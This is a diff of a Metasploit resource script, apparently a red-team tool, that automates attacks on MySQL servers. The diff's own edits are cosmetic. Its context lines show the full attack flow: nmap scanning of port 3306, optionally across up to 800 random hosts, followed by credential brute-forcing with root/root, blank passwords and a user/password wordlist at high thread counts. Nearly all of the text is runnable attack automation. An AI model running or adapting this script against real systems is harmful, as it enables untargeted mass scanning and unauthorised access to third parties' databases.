@@ -1,4 +1,5 @@
    <ruby>
+      run_single("workspace -a redteam")
       help = %Q|
         Description:
           setg SAVE_DB true - Save workspace redteam to database.xml
@@ -26,7 +27,6 @@
       print_line("")
 
 
-      run_single("workspace -a redteam")
       if (framework.datastore['RANDOM_HOSTS'] == "true")
          if (framework.datastore['LIMMIT'] == nil or framework.datastore['LIMMIT'] == '')
            run_single("setg LIMMIT 800")
@@ -43,6 +43,7 @@
       if (framework.datastore['USERPASS_FILE'] == nil or framework.datastore['USERPASS_FILE'] == '')
          run_single("setg USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/piata_ssh_userpass.txt")
       end
+
       unless (framework.datastore['RANDOM_HOSTS'] == "true")
          run_single("db_nmap -sV -Pn -T4 -O -p 3306 --script=mysql-info.nse --open #{framework.datastore['RHOSTS']}")
       else
@@ -85,6 +86,7 @@
               Rex::sleep(1.0)
               run_single("use auxiliary/scanner/mysql/mysql_version")
               run_single("set THREADS 20")
+              print_line("")
               run_single("services -c name -S mysql -R")
               run_single("exploit")
               Rex::sleep(1.5)
@@ -92,6 +94,7 @@
               run_single("set USERNAME root")
               run_single("set PASSWORD root")
               run_single("set THREADS 20")
+              print_line("")
               run_single("services -c name -S mysql -R")
               run_single("exploit")
               Rex::sleep(1.5)
@@ -101,6 +104,7 @@
               run_single("set BLANK_PASSWORDS true")
               run_single("set VERBOSE true")
               run_single("set THREADS 100")
+              print_line("")
               run_single("services -c name -S mysql -R")
               run_single("exploit")
               Rex::sleep(1.5)
